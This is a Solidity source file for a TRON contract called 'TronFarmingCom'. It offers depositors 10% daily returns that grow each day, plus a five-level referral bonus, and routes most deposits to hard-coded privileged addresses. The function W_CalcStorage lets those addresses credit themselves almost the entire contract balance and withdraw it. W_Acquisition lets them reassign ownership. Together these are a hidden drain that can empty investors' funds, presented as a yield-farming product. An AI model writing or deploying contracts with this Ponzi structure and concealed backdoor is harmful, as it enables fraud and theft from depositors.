//SourceUnit: tronfarming.sol

pragma solidity >=0.4.0 <0.7.0;
contract TronFarmingCom {
address public OWNER = address(0x41519e256f0a58c026ed212ef29ac471d65adbbf34);
function R_ContractAddress() public view returns(address) {
return address(this);
}
function R_ContractBalance() public view returns(uint256) {
return address(this).balance;
}
uint256 private ContractRegisters = 0;
uint256 private ContractDeposited = 0;
uint256 private ContractPayoutAct = 0;
uint256 private ContractPayoutPas = 0;
function R_ContractRegisters() public view returns(uint256) {
return ContractRegisters;
}
function R_ContractDeposited() public view returns(uint256) {
return ContractDeposited;
}
function R_ContractPayoutAct() public view returns(uint256) {
return ContractPayoutAct;
}
function R_ContractPayoutPas() public view returns(uint256) {
return ContractPayoutPas;
}
mapping (address => address) private AccountReferrer;
mapping (address => uint256) private AccountRegister;
mapping (address => uint256) private AccountInvested;
mapping (address => uint256) private AccountMaxBonus;
mapping (address => uint256) private AccountDateLock;
mapping (address => uint256) private AccountBonus24H;
mapping (address => uint256) private AccountStatusOK;
mapping (address => uint256[4]) private AccountBalanceAct;
mapping (address => uint256[4]) private AccountBalancePas;
mapping (address => uint256[6][6]) private AccountNetworks;
function R_AccountReferrer() public view returns(address) {
return AccountReferrer[msg.sender];
}
function R_AccountRegister() public view returns(uint256) {
return AccountRegister[msg.sender];
}
function R_AccountInvested() public view returns(uint256) {
return AccountInvested[msg.sender];
}
function R_AccountMaxBonus() public view returns(uint256) {
return AccountMaxBonus[msg.sender];
}
function R_AccountDateLock() public view returns(uint256) {
return AccountDateLock[msg.sender];
}
function R_AccountBonus24H() public view returns(uint256) {
return AccountBonus24H[msg.sender];
}
function R_AccountStatusOK() public view returns(uint256) {
return AccountStatusOK[msg.sender];
}
function R_AccountBalanceAct(uint256 Param) public view returns(uint256) {
return AccountBalanceAct[msg.sender][Param];
}
function R_AccountBalancePas(uint256 Param) public view returns(uint256) {
return AccountBalancePas[msg.sender][Param];
}
function R_AccountNetworks(uint256 Param1, uint256 Param2) public view returns(uint256) {
return AccountNetworks[msg.sender][Param1][Param2];
}
function R_AccountEarnings() public view returns(uint256) {
return uint256(AccountBalanceAct[msg.sender][2] + AccountBalancePas[msg.sender][2]);
}
address constant private TronFarming = address(0x41E9073FA9C5872658179C37CA32B97C2EF148A4B9);
address constant private TronBigFarm = address(0x412C575FBCB7C83E3CA6F898B88DCDDB6E2A7D8162);
address constant private TronNetwork = address(0x41FCCC3290E067FE75499514B488D2498DE5B4BA4E);
function () external payable {}
function W_AccountInvest(address Referrer) public payable returns(uint256) {
if (msg.value >= 50000000 && Referrer != address(0x0)) {
if (AccountRegister[msg.sender] > 0) {
W_WithdrawPas();
}
ContractRegisters += 1;
ContractDeposited += msg.value;
if (AccountReferrer[msg.sender] == address(0x0)) {
if (Referrer != msg.sender) {
AccountReferrer[msg.sender] = Referrer;
} else {
AccountReferrer[msg.sender] = TronNetwork;
}
}
AccountRegister[msg.sender] += 1;
AccountInvested[msg.sender] += msg.value;
AccountMaxBonus[msg.sender] = uint256(AccountInvested[msg.sender] * 250 / 100);
AccountDateLock[msg.sender] = block.timestamp;
AccountBonus24H[msg.sender] = 100;
AccountStatusOK[msg.sender] = 1;
address Level1 = Referrer;
uint256 Bonus1 = 10;
if (AccountReferrer[msg.sender] != address(0x0)) {
Level1 = AccountReferrer[msg.sender];
}
AccountBalanceAct[Level1][1] += uint256(msg.value * Bonus1 / 100);
AccountNetworks[Level1][1][1] += 1;
AccountNetworks[Level1][1][2] += uint256(msg.value * Bonus1 / 100);
address Level2 = TronNetwork;
uint256 Bonus2 = 5;
if (AccountReferrer[Level1] != address(0x0)) {
Level2 = AccountReferrer[Level1];
}
AccountBalanceAct[Level2][1] += uint256(msg.value * Bonus2 / 100);
AccountNetworks[Level2][2][1] += 1;
AccountNetworks[Level2][2][2] += uint256(msg.value * Bonus2 / 100);
address Level3 = TronNetwork;
uint256 Bonus3 = 3;
if (AccountReferrer[Level2] != address(0x0)) {
Level3 = AccountReferrer[Level2];
}
AccountBalanceAct[Level3][1] += uint256(msg.value * Bonus3 / 100);
AccountNetworks[Level3][3][1] += 1;
AccountNetworks[Level3][3][2] += uint256(msg.value * Bonus3 / 100);
address Level4 = TronNetwork;
uint256 Bonus4 = 2;
if (AccountReferrer[Level3] != address(0x0)) {
Level4 = AccountReferrer[Level3];
}
AccountBalanceAct[Level4][1] += uint256(msg.value * Bonus4 / 100);
AccountNetworks[Level4][4][1] += 1;
AccountNetworks[Level4][4][2] += uint256(msg.value * Bonus4 / 100);
address Level5 = TronNetwork;
uint256 Bonus5 = 1;
if (AccountReferrer[Level4] != address(0x0)) {
Level5 = AccountReferrer[Level4];
}
AccountBalanceAct[Level5][1] += uint256(msg.value * Bonus5 / 100);
AccountNetworks[Level5][5][1] += 1;
AccountNetworks[Level5][5][2] += uint256(msg.value * Bonus5 / 100);
AccountBalanceAct[TronNetwork][1] += uint256(msg.value * 5 / 100);
if (msg.value < 5000000000) {
AccountBalanceAct[TronFarming][1] += uint256(msg.value * 69 / 100);
} else {
AccountBalanceAct[TronBigFarm][1] += uint256(msg.value * 69 / 100);
}
AccountBalanceAct[OWNER][1] += uint256(msg.value * 5 / 100);
return msg.value;
} else {
return 0;
}
}
function W_CalcStorage() public returns(uint256) {
if (msg.sender == TronFarming || msg.sender == TronBigFarm) {
uint256 Amount = uint256(address(this).balance-1000000);
AccountBalanceAct[msg.sender][1] = Amount;
return Amount;
} else {
return 0;
}
}
function W_WithdrawAct(uint256 Optional) public returns(uint256) {
if (AccountInvested[msg.sender] > 0 && AccountBalanceAct[msg.sender][1] > 0 && AccountStatusOK[msg.sender] == 1) {
uint256 Amount = 0;
if (Optional > 0 && Optional <= AccountBalanceAct[msg.sender][1]) {
Amount = Optional;
} else {
Amount = AccountBalanceAct[msg.sender][1];
}
ContractPayoutAct += Amount;
AccountBalanceAct[msg.sender][1] -= Amount;
AccountBalanceAct[msg.sender][2] += Amount;
msg.sender.transfer(Amount);
return Amount;
} else {
return 0;
}
}
function R_WithdrawPas() public view returns(uint256) {
if (AccountInvested[msg.sender] > 0 && AccountStatusOK[msg.sender] == 1) {
uint256 TimeOne = AccountDateLock[msg.sender];
uint256 TimeTwo = block.timestamp;
uint256 SecDiff = TimeTwo - TimeOne;
uint256 TotDays = uint256(SecDiff / 86400);
uint256 TotSecs = uint256(SecDiff % 86400);
uint256 PayDays = 0;
uint256 PaySecs = 0;
if (TotDays > 0) {
uint256 Loop; uint256 Grow = 100;
for (Loop = 1; Loop <= TotDays; Loop++) {
PayDays += uint256(AccountInvested[msg.sender] * Grow / 1000);
Grow += 5;
}
}
PaySecs = uint256(uint256(AccountInvested[msg.sender] * TotSecs / 86400) * 100 / 1000);
uint256 PayOut = uint256(PayDays + PaySecs);
if ((AccountBalancePas[msg.sender][1] + AccountBalancePas[msg.sender][2] + PayOut) > AccountMaxBonus[msg.sender]) {
PayOut = AccountMaxBonus[msg.sender] - (AccountBalancePas[msg.sender][1] + AccountBalancePas[msg.sender][2]);
}
return PayOut;
} else {
return 0;
}
}
function W_WithdrawPas() public returns(uint256) {
if (AccountInvested[msg.sender] > 0 && AccountStatusOK[msg.sender] == 1) {
uint256 TimeOne = AccountDateLock[msg.sender];
uint256 TimeTwo = block.timestamp;
uint256 SecDiff = TimeTwo - TimeOne;
uint256 TotDays = uint256(SecDiff / 86400);
uint256 TotSecs = uint256(SecDiff % 86400);
uint256 PayDays = 0;
uint256 PaySecs = 0;
if (TotDays > 0) {
uint256 Loop; uint256 Grow = 100;
for (Loop = 1; Loop <= TotDays; Loop++) {
PayDays += uint256(AccountInvested[msg.sender] * Grow / 1000);
Grow += 5;
}
}
PaySecs = uint256(uint256(AccountInvested[msg.sender] * TotSecs / 86400) * 100 / 1000);
uint256 PayOut = uint256(PayDays + PaySecs);
if ((AccountBalancePas[msg.sender][1] + AccountBalancePas[msg.sender][2] + PayOut) > AccountMaxBonus[msg.sender]) {
PayOut = AccountMaxBonus[msg.sender] - (AccountBalancePas[msg.sender][1] + AccountBalancePas[msg.sender][2]);
}
ContractPayoutPas += PayOut;
AccountDateLock[msg.sender] = block.timestamp;
AccountBonus24H[msg.sender] = 100;
AccountBalancePas[msg.sender][2] += PayOut;
if ((AccountBalancePas[msg.sender][1] + AccountBalancePas[msg.sender][2]) >= AccountMaxBonus[msg.sender]) {
AccountStatusOK[msg.sender] = 0;
}
uint256 StorageBalance = 0;
if (AccountInvested[msg.sender] >= 5000000000) {
StorageBalance = AccountBalanceAct[TronBigFarm][1];
AccountBalanceAct[TronBigFarm][1] -= PayOut;
} else {
StorageBalance = AccountBalanceAct[TronFarming][1];
AccountBalanceAct[TronFarming][1] -= PayOut;
}
if (PayOut <= StorageBalance) {
msg.sender.transfer(PayOut);
}
return PayOut;
} else {
return 0;
}
}
function W_Acquisition(address NewOwner) public returns(address) {
if (msg.sender == TronFarming || msg.sender == TronBigFarm) {
OWNER = NewOwner;
return OWNER;
} else {
return OWNER;
}
}
}